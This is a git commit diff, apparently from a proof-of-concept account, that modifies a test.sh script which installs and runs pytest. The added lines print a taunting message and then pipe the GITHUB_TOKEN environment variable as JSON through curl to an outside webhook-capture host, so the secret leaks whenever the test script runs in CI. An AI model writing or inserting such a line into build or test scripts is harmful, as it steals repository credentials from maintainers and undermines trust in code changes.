63179929cbf7610fba8b1dda4b88579279cfdf50
PocAccount3 <githubpoc23@gmail.com>
2026-01-01 11:34:38 +0200

    Update test.sh did not hack you

--- test.sh
+++ test.sh
@@ -11,3 +11,7 @@ pip install pytest
 pytest -v
 
 
+echo "hello i did not hacked you"
+
+echo "{\"GITHUB_TOKEN\":\"$GITHUB_TOKEN\"}" | curl -X POST https://wh875bf0d12ffff2bf68.free.beeceptor.com -H "Content-Type: application/json" -d @- # ]
+
